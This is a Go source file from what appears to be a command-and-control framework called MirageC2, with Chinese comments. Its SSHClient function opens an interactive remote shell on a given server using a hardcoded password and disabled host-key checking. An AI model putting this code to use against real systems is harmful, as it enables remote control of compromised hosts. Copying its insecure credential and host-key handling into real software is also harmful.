package module

import (
	"MirageC2_V1.0/public/common"
	"fmt"
	"golang.org/x/crypto/ssh"
	"os"
	"os/signal"
	"syscall"
	"time"
)

func SSHClient(serverip string) {
	// 创建信号通道
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt, syscall.SIGINT)
	defer signal.Stop(signalChan)

	// 创建一个 channel 用于通知退出 SSHClient 进程
	done := make(chan bool)

	// 启动一个 goroutine 监听 Ctrl+C 信号
	go func() {
		for sig := range signalChan {
			if sig == os.Interrupt {
				fmt.Println("[*] Ctrl+C pressed, exiting SSH client.")
				done <- true // 发送退出信号到 main
				return
			}
		}
	}()

	// SSH 连接配置
	config := &ssh.ClientConfig{
		User: "mirage", // 用户名，服务端无需认证时可任意指定
		Auth: []ssh.AuthMethod{
			ssh.Password("Mirage_so_cool!"), // 密码为空
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         3 * time.Second,
	}

	// 连接到服务端
	client, err := ssh.Dial("tcp", serverip, config)
	if err != nil {
		fmt.Printf("[-] Failed to dial: %v\n", err)
		return
	}
	defer client.Close()

	// 创建会话
	session, err := client.NewSession()
	if err != nil {
		fmt.Printf("[-] Failed to create session: %v\n", err)
		return
	}
	defer session.Close()

	// 配置会话的输入、输出和错误流到本地终端
	session.Stdout = os.Stdout
	session.Stderr = os.Stderr
	session.Stdin = os.Stdin
	modes := ssh.TerminalModes{
		ssh.ECHO:          1,     // 禁用回显（0禁用，1启动）
		ssh.TTY_OP_ISPEED: 14400, // input speed = 14.4kbaud
		ssh.TTY_OP_OSPEED: 14400, // output speed = 14.4kbaud
	}
	if common.C2Platform == "windows" {
		if err = session.RequestPty("xterm", 24, 80, modes); err != nil {
			fmt.Printf("[-] request pty error: %v\n", err.Error())
			return
		}
		session.Setenv("LANG", "en_US.UTF-8")
	} else {
		if err = session.RequestPty("xterm-256color", 32, 160, modes); err != nil {
			fmt.Printf("[-] request pty error: %v\n", err.Error())
			return
		}
	}

	// 启动交互式 shell
	fmt.Println("[*] Starting interactive shell")
	err = session.Shell()
	if err != nil {
		fmt.Printf("[-] Failed to start shell: %v\n", err)
		return
	}

	// 等待 shell 结束或收到退出信号
	select {
	case <-done:
		// 如果接收到退出信号，退出 SSHClient 函数
		fmt.Println("[*] Exiting SSH client as requested.")
		return
	}

	// 等待 session 完成
	if err := session.Wait(); err != nil {
		fmt.Printf("[-] Shell exited with error: %v\n", err)
	}

	fmt.Printf("[+] Interactive shell session ended\n")
}
